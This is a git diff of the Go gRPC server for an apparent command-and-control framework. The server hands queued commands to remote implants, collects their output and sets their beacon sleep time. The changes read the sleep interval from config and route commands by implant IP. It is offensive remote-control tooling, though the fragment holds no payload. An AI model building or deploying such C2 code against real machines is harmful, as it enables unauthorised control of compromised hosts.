@@ -4,7 +4,7 @@
  * @Autor: ABing
  * @Date: 2024-06-19 11:23:41
  * @LastEditors: lhl
- * @LastEditTime: 2024-06-19 15:16:45
+ * @LastEditTime: 2024-06-19 17:58:21
  */
 package implant
 
@@ -12,14 +12,13 @@ import (
 	"context"
 	"errors"
 	"fmt"
+	"gotoexec/config"
 	"gotoexec/grpcapi"
 	"log"
 	"net"
 
 	"google.golang.org/grpc/peer"
 )
-
-var sleepTime int32 = 3
 
 type implantServer struct {
 	work, output chan *grpcapi.Command
@@ -33,8 +32,6 @@ func NewImplantServer(work, output chan *grpcapi.Command) *implantServer {
 }
 
 func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
-
-	log.Println("有客户端上线了")
 
 	p, ok := peer.FromContext(ctx)
 	if !ok {
@@ -52,6 +49,13 @@ func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) 
 	select {
 	case cmd, ok := <-s.work:
 		if ok {
+
+			if cmd.Ip != clientIP {
+				s.work <- cmd
+				log.Println("不是客户端", clientIP, "的数据,是", cmd.Ip)
+				return cmd, errors.New("不是我的")
+			}
+
 			return cmd, nil
 		}
 		return cmd, errors.New("channel closed")
@@ -66,6 +70,6 @@ func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command)
 }
 func (s *implantServer) GetSleepTime(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.SleepTime, error) {
 	time := new(grpcapi.SleepTime)
-	time.Time = sleepTime
+	time.Time = config.CoreConf.SleepTime
 	return time, nil
 }
